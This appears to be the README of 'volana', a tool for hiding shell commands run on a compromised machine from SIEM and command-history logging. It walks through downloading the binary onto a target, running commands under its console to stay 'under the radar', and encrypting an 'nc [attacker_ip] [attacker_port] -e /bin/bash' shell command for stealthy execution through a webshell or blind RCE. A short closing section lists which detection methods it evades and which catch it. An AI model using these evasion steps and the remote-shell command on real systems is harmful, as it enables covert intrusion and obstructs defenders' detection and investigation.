
<div align="center">
 <h1> volana 🌙</h1>  
 <h4> Shell command obfuscation to avoid SIEM detection </h4>
 <p> During pentest, an important aspect is to be stealth. For this reason you should clear your tracks after your passage. Nevertheless, many infrastructures log command and send  them to a SIEM in a real time making the cleaning part alone useless.<br><br><code>volana</code> provide a simple way to hide commands executed on compromised machine by providing it self shell runtime (enter your command, volana execute for you).</p>

  <p><strong><code>{ <a href="#usage">Use it</a> ; <a href="#hide-from">🌚<sub>(hide from)</sub></a>; <a href="#visible-for">🌞<sub>(detected by)</sub></a> } </code></strong></p>
</div>

## Usage

You need to get an interactive shell. (Find a way to spawned it, you are a hacker, it's your job !). Then download it on target machine and launch it. that's it, now you can type the command you want to be stealthy executed 
```shell
## Download it from github release
## If you do not have internet access from compromised machine, find another way
curl -lO -L https://github.com/ariary/volana/releases/latest/download/volana

## Execute it
./volana

## You are now under the radar
volana » echo "Hi SIEM team! Do you find me?" > /dev/null 2>&1  #you are allowed to be a bit cocky
volana » [command]
```

Keyword for volana console:
* `ring`: enable ring mode ie each command is launched with plenty others to cover tracks (from solution that monitor system call)
* `exit`: exit volana console

### from non interactive shell

Imagine you have a non interactive shell (webshell or blind rce), you could use `encrypt` and `decrypt` subcommand.
Previously, you need to build `volana` with embedded encryption key.

**On attacker machine**
```shell
## ATTACKER MACHINE

## Build volana with encryption key
make build.volana-with-enc

## Transfer it on TARGET (the unique detectable command)
## [...]

## Encrypt the command you want to stealthy execute
## (Here a nc bindshell to obtain a interactive shell)
volana encrypt "nc [attacker_ip] [attacker_port] -e /bin/bash"
**encrypted cmd**
```

Copy encrypted command and executed it with your rce **on target machine**
```shell
./volana decrypt [encrypted_command]
## Now you have a bindshell shell, spawn it to make it interactive and use volana normally)

```

***Why not just hide command with `echo [command] | base64` ?***
And decode on target with `echo [encoded_command] | base64 -d | bash`

Because we want to be protected against system that trigger alert for `base64` use or that seek base64 text in command. Also we want to make investigation difficult and base64 isn't a real brake.

## Detection

Keep in mind that `volana` is not a miracle that will make you totally invisible. It aim is to make intrusion detection and investigation harder.

By detected we mean if we are able to trigger an alert if a certain command has been executed.


### Hide from

Only the `volana` launch command line will be catched


* Detection systems that are based on history command output
* Detection systems that are based on historic files
  * `.bashrc`,`zshrc`, `bash_history` etc ..

### Visible for

* Detection systems that have alert for unknown command (volana one)
* Detection systems that are based on keylogger
  * Easy to avoid: copy/past commands
  * Not a common case
